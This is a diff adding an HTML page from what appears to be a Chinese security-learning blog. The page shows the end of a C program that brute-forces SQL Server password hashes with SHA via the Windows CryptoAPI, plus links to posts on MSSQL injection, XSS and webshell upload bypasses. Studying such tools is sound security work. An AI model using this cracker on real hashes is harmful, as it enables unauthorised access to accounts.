+         uwttf[cnt]=x;
+         cnt++;
+         t = key &lt;&lt; 24;
+         t = t &gt;&gt; 24;
+         x = (unsigned char) t;
+         uwttf[cnt]=x;
+         cnt++;
+// Create the hash
+if(!CryptCreateHash(hProv, CALG_SHA, 0 , 0, &amp;hHash))
+         {
+                   printf("Error %x during CryptCreatHash!\n", GetLastError());
+                   return 0;
+         }
+if(!CryptHashData(hHash, (BYTE *)uwttf, len*2+4, 0))
+         {
+                   printf("Error %x during CryptHashData!\n", GetLastError());
+                   return FALSE;
+         }
+CryptGetHashParam(hHash,HP_HASHVAL,(byte*)szhash,&amp;hl,0);
+// Test the first byte only. Much quicker.
+if(szhash[0] == cmp)
+         {
+                   // If first byte matches try the rest
+                   ptr = pucase;
+                   cnt = 1;
+                   while(cnt &lt; 20)
+                   {
+                               ptr = ptr + 2;
+                               strncpy(pucfirst,ptr,2);
+                               sscanf(pucfirst,"%x",&amp;cmp);
+                               if(szhash[cnt]==cmp)
+                                        cnt ++;
+                               else
+                               {
+                                        break;
+                               }
+                   }
+                   if(cnt == 20)
+                   {
+                        // We've found the password
+                        printf("\nA MATCH!!! Password is %s\n",wttf);
+                        return 0;
+                     }
+             }
+             count = 0;
+             cnt=0;
+           }
+  return 0;
+}
+</code></pre>
+
+<hr />
+
+<p>以上只是自己肤浅的总结，后面还有很多知识需要更新和添加，希望自己不断成长！<br />
+<a href="http://corener.github.io/">corener</a></p>
+
+    </div>
+
+    <div class="sidenav">
+        <h2>Blog</h2>
+        <ul class="artical-list">
+        
+            <li><a href="/MsSql_wiki">有关MsSql注入的备忘录</a></li>
+        
+            <li><a href="/summarize-of-XSS-with-case">XSS的常见情况总结</a></li>
+        
+            <li><a href="/summarize_of_webshell_fileUpload">有关上传webshell文件绕过的总结</a></li>
+        
+            <li><a href="/01-Hacking-learning-and-summarize">Hacking-learning-and-summarize</a></li>
+        
+            <li><a href="/java-virtual-mechine">Java虚拟机简介</a></li>
+        
+            <li><a href="/web-server">也谈如何构建高性能服务端程序</a></li>
+        
+            <li><a href="/markdown-basics">markdown 快速入门</a></li>
+        
+        </ul>
+
+        <h2>Dump</h2>
+        <ul class="artical-list">
+        
+        </ul>
+
+        <h2>Project</h2>
+        <ul class="artical-list">
+        
+        </ul>
+    </div>
+</div>
+
+<script src="/js/post.js" type="text/javascript"></script>
+
+
+    <script type="text/javascript">
+        $(function(){
+            $('.home-follow').click(function(e){
+                e.preventDefault();
+
+                if($('.home-contact').is(':visible')){
+                    $('.home-contact').slideUp(100);
+                }else{
+                    $('.home-contact').slideDown(100);
+                }
+            });
+        })
+    </script>
+</body>
+</html>
